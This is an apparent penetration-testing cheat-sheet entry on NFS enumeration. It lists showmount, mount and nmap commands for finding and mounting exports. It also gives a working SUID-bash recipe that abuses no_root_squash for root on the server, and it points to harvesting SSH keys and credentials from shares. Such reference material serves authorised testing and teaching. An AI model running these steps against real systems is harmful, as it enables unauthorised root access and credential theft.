---
tool: NFS enumeration
slug: nfs-enum
kind: technique
stages: [pre-compromise]
targets: [linux]
category: Exports, mounts and no_root_squash
platforms: [linux, network]
services: [nfs]
ports: [111, 2049]
tags: [enumeration, nfs, shares, privilege escalation, footprinting]
attack: [T1135, T1083, T1068]
summary: Lists a host's NFS exports, mounts the ones you can reach, and reads or writes the files inside. A misconfigured export — world-readable data, or the dangerous no_root_squash — turns a network share into file access and sometimes a direct route to root.
references:
  - NFS (Arch wiki) | https://wiki.archlinux.org/title/NFS
  - HackTricks — NFS | https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
---

## When to reach for it

Port 2049 (and 111/rpcbind) is open. NFS often exports directories with weak controls, so list what is shared, mount it, and see what you can read or write. The classic win is `no_root_squash`, which lets a client's root write files that stay root-owned on the server.

## Key flags

- `showmount -e HOST`: list the exported directories and who may mount them.
- `mount -t nfs HOST:/export /mnt -o nolock`: mount an export locally.
- `nmap --script nfs-ls,nfs-showmount,nfs-statfs`: scripted enumeration.
- Access is by UID/GID, so matching a local user's UID to the file owner matters.

## Commands

List exports, then mount one:

```bash
showmount -e HOST
mkdir -p /mnt/nfs
mount -t nfs HOST:/home /mnt/nfs -o nolock
```

Nmap's NFS scripts in one pass:

```bash
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs HOST
```

Abuse no_root_squash to get root on the server (write a SUID shell):

```bash
# as root on your box, into a writable export mounted at /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# then on the target, as any user: /path/to/export/rootbash -p
```

## Workflow

1. `showmount -e` to see every export and its access rules.
2. Mount what you can and read it — configs, keys, home directories, backups.
3. Check the export options for `no_root_squash` and whether it is writable.
4. If so, drop a root-owned SUID binary from your (root) box and run it on the target.
5. Note file UIDs — matching a local user to them may let you read "protected" files.

## Notes

NFS trusts the client's UID/GID, so access control is only as good as the export options. `no_root_squash` is the headline misconfiguration, but even plain read access to home directories often yields SSH keys and credentials. Unmount cleanly when done (`umount /mnt/nfs`). Pair this with the Linux privesc note — the SUID-binary trick is a standard escalation once a writable export exists.
